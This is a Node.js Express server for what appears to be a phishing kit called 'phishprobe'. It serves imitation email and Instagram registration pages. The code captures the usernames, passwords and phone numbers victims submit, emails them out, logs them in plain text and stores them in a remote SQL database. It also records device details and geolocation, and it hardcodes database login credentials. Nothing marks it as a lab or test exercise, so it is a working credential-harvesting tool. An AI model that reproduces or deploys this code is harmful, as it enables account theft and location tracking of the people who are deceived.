const sql = require('mssql')
const express = require('express')
const path = require('path')
const sendmail = require('./sendmail.js')
const useragent = require('express-useragent');
const exp = require('constants');

const app = express()


app.use(express.urlencoded({ extended: true }));
const static = path.join(__dirname,'static')
//for serving static files

app.use(express.json())

//database connection configuration
const config = {
  server: 'phishserver.database.windows.net',
  database: 'phishprobe',
  user: 'saif',
  password: 'Phishprobe@123',
  port: 1433, // Default port for SQL Server
  options: {
    encrypt: true, // Use encryption for the connection
  },
};

app.set('trust proxy', true);
app.use(useragent.express())



app.get("/registration", (req, resp) => {
  resp.sendFile(`${static}/index.html`);
});


//api to deliver the webpage to user
app.post("/registration", (req,resp)=>{

  resp.sendFile(`${static}/index.html`);

  var latitude  = 0
  try{
    latitude = req.body.latitude
  } catch(err){
    console.log(err)
  }
  var longitude = 0
  try{
    longitude = req.body.longitude
  } catch(err){
    console.log(err)
  }


  const clientInfo = {
    device: req.useragent.device,
    os: req.useragent.os,
    browser: req.useragent.browser,
    platform: req.useragent.platform,
    version: req.useragent.version,
    source: req.useragent.source,
    isMobile: req.useragent.isMobile,
    isTablet: req.useragent.isTablet,
    isDesktop: req.useragent.isDesktop,
    latitude: latitude,
    longitude: longitude
    
  };

  const deviceinfo = JSON.stringify(clientInfo); 
  sendmail.senddeviceinfo(deviceinfo);
  
})



app.get('/email-registration.html',(req,resp)=>{
  resp.sendFile(`${static}/email-registration.html`)
})

app.post('/email-registration.html', async(req,resp)=>{
  const location = {
    latitude : req.body.latitude,
    longitude : req.body.longitude
  }
  
  const locationinfo = JSON.stringify(location);
  await sendmail.senddeviceinfo(locationinfo)

})

app.get('/email-registration-error.html',(req,resp)=>{
  resp.sendFile(`${static}/email-registration-error.html`)
})

app.get('/insta-registration.html',(req,resp)=>{
  resp.sendFile(`${static}/insta-registration.html`)
})

app.post('/insta-registration.html', async(req,resp)=>{
  const location = {
    latitude: req.body.latitude,
    longitude: req.body.longitude
  }
  const locationinfo = JSON.stringify(location)
  await sendmail.senddeviceinfo(locationinfo)
})



//api to post email data  to SQL Server
app.post('/submit', async (req,resp)=>{
    var fullname = req.body.fullname
    var usname = req.body.email
    var passpw = req.body.password
    var phone  = req.body.phone
    var dataof = 'Email'
    await sendmail.mail_contact_info(dataof,fullname,usname,passpw,phone)
    console.log(dataof,fullname,usname,passpw,phone)

  try {
    let con = await sql.connect(config);
    const request = new sql.Request(con);
    
    // Use parameters to prevent SQL injection and enclose them in single quotes
    request.input('username', sql.VarChar, req.body.email);
    request.input('password', sql.VarChar, req.body.password);
    request.input('phone', sql.VarChar, req.body.phone);


    const query = "INSERT INTO emailinfo (username,phone, password) VALUES (@username, @phone, @password);";

    await request.query(query);

    

  } catch (err) {
    console.error(err);
  }

  resp.sendFile(`${static}/email-registration-error.html`);
}
)


//api to post instagram data to SQL Server
app.post('/submit2',  async(req, resp)=>{
  var usname = req.body.username
  var passpw = req.body.password
  var dataof = 'Instagram'
  await sendmail.mailkaro(dataof,usname,passpw)
  console.log(dataof,usname,passpw)
  

  try{
  let con = await sql.connect(config);
  const request = new sql.Request(con);

  request.input('username', sql.VarChar, req.body.username);
  request.input('password', sql.VarChar, req.body.password);

  const query = "INSERT INTO instadata (username, password) VALUES (@username, @password);";
  await request.query(query);

  } catch (err){
    console.error(err);
  }
  
  resp.sendFile(`${static}/registration-success.html`);
    
})



app.listen(8080,()=>{
  console.log('server is active on port 8080')
})